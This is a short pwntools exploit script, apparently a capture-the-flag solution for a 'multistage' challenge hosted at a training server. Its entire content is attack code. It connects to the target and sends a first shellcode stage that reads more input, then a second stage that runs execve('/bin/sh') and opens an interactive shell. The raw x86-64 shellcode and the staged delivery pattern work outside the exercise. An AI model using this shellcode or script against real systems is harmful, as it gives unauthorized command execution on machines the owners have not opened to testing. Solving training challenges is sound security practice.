from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	r = process("./multistage")
#	gdb.attach(r,"""
#		c
#	""")
#	input("wait")
else:
	r = remote("bin.training.offdef.it", 2003)

#r.wait(1)

r.send(b"\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\xB2\xFF\x0F\x05")

#r.wait(1)

r.send(b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")

r.interactive()
